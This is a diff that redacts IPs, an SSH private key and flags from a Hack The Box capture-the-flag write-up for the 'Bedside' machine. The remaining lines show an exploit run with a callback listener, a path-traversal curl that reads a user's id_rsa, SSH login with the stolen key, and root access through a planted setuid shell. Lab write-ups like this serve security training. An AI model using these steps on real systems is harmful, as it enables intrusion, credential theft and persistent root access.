@@ -8,7 +8,7 @@ description: "Bedside HTB - Complete Writeup (CVE-2025-64512 → Root)"
 ## 1. Initial Enumeration
 
 ```bash
-nmap -sC -sV 10.129.35.240
+nmap -sC -sV 10.129.x.x
 ```
 
 **Findings:**
@@ -17,7 +17,7 @@ nmap -sC -sV 10.129.35.240
 - Port 3000: filtered
 
 ```bash
-echo "10.129.35.240 bedside.htb" | sudo tee -a /etc/hosts
+echo "10.129.x.x bedside.htb" | sudo tee -a /etc/hosts
 ```
 
 ## 2. Subdomain Discovery
@@ -32,7 +32,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
 **Finding:** `research.bedside.htb` returns 200 OK
 
 ```bash
-echo "10.129.35.240 research.bedside.htb" | sudo tee -a /etc/hosts
+echo "10.129.x.x research.bedside.htb" | sudo tee -a /etc/hosts
 ```
 
 ## 3. Research Portal Analysis
@@ -59,7 +59,7 @@ Visiting `http://research.bedside.htb/` reveals:
 Use the automated exploit script:
 
 ```bash
-python3 exploit.py 10.129.35.240 -L 10.10.14.39:9001
+python3 exploit.py 10.129.x.x -L 10.10.14.39:9001
 ```
 
 The script:
@@ -91,13 +91,7 @@ curl --path-as-is http://localhost:3000/../../../../home/developer/.ssh/id_rsa
 
 **Output:**
 ```
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
-SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
-AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
-RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
------END OPENSSH PRIVATE KEY-----
+<REDACTED_PRIVATE_KEY>
 ```
 
 ### SSH as Developer
@@ -106,22 +100,16 @@ From your attack box:
 
 ```bash
 cat > dev_key << 'EOF'
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
-SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
-AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
-RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
------END OPENSSH PRIVATE KEY-----
+<REDACTED_PRIVATE_KEY>
 EOF
 
 chmod 600 dev_key
-ssh -i dev_key developer@10.129.35.240
+ssh -i dev_key developer@10.129.x.x
 ```
 
 **Result:** Shell as `developer@bedside:~$`
 
-**User Flag:** `2b942951932eed7134cabc40cd5802f0`
+**User Flag:** `<USER_FLAG>`
 
 ---
 
@@ -194,7 +182,7 @@ The RCE created `/usr/local/bin/rootbash` with setuid bit. Use it to escalate:
 **Output:**
 ```
 uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
-152de8dbff33e85b7994da398f602e60
+<ROOT_FLAG>
 ```
 
 Or get an interactive root shell:
@@ -208,7 +196,7 @@ Or get an interactive root shell:
 ## Root Flag
 
 ```
-152de8dbff33e85b7994da398f602e60
+<ROOT_FLAG>
 ```
 
 ---
